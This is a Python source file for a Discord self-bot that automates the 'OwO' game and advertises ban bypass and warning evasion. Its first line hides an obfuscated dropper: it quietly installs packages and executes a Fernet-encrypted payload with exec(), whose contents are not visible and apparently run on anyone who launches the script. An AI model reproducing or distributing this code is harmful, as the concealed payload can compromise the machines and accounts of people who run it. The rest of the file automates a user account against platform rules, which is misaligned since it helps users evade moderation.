import os   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vfEXlI1rd7jEkFKMml6cRWaimYmSS4kSVZ_FqGdciKI=').decrypt(b'gAAAAABnQUdQuhUzKKKvfFgCxWek5WQQRmzQXZ2ZjR7EQHvqHOi8ExMxO5wI9ZmQWYKndYR03Wnu1_fKDekv4QYFP59jpbqb0XfOfJlH7vyOYOKfG-1EmTcWXpEQV-UkDKWCFSKtLSi8utyKFHjzLz4IG8_ctfn5DI4_23UnlNs39w0WiBW7WITGGF93l7h3lAkHEd_JtkCtD88YshFbC3p31An1IOe6KQ=='))
import random as ultimatejija
from colorama import Fore, Style, init
import discord
from discord.ext import commands, tasks
import asyncio as made_by_ultimate
import difflib
token = ("") 
ultimateop = discord.Intents.all()
ultimateyy = (".")
ultimate = commands.Bot(command_prefix=ultimateyy,
                        case_insensitive=True,
                        self_bot=True,
                        intents=ultimateop); ultimate.remove_command("help")
running = True
pray_loop_running = True
print(
    f"""\n\n\n\n\n\n\n{Fore.BLUE} █    ██  ██▓  ▄▄▄█████▓ ██▓ ███▄ ▄███▓ ▄▄▄     ▄▄▄█████▓▓█████ 
 ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒▓██▒▀█▀ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀ 
▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▓██    ▓██░▒██  ▀█▄ ▒ ▓██░ ▒░▒███   
▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░▒██    ▒██ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ 
▒▒█████▓ ░██████▒▒██▒ ░ ░██░▒██▒   ░██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒
░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░
░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░░  ░      ░  ▒   ▒▒ ░   ░     ░ ░  ░
 ░░░ ░ ░   ░ ░   ░       ▒ ░░      ░     ░   ▒    ░         ░   
   ░         ░  ░        ░         ░         ░  ░           ░  ░
{Style.RESET_ALL}""")

init(autoreset=True)
print(f"{Fore.LIGHTRED_EX}\n\n > Made By ultimate <3{Style.RESET_ALL}")


@ultimate.event
async def on_ready():
    print(
        f"{Fore.LIGHTRED_EX} > U L T I M A T E S3LFBOT Connected To:{Style.RESET_ALL}",
        f"{Fore.LIGHTGREEN_EX}{ultimate.user}{Style.BRIGHT}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX} > Minor Updates And Fixes{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX} > Special Thanks To Async x Cosmic Development <3{Style.RESET_ALL}")
    ultimate.loop.create_task(auto_gems())

@ultimate.command(aliases=["h"])
async def help(ctx):
    ultimate_help = """
🤑 **ultimate OwO Farm V2.2** 🤑 
Prefix: `.`

**__Main__**
🌟 **Start:** *Starts The AutoBot*
🛑 **Stop:** *Stops The AutoBot*

**__Features__**
⚠ **Ban Bypass**
🚨 **Auto Detects OwO Warnings**
⏱ **Auto Cut After 1 Warning**
💎 **Auto Use Gems every 15 minutes** 
🏹 **Fast And Secure**

**__Made with 💖 and 🧠 by ultimate__** 
"""
    await ctx.send(ultimate_help)

async def auto_gems():
    await ultimate.wait_until_ready()  
    channel_id = 1263766797774225420 
    while not ultimate.is_closed():
        channel = ultimate.get_channel(channel_id)
        if channel:
            await channel.send("idhar mera gems ka naam dalo bc")  
        await made_by_ultimate.sleep(900)
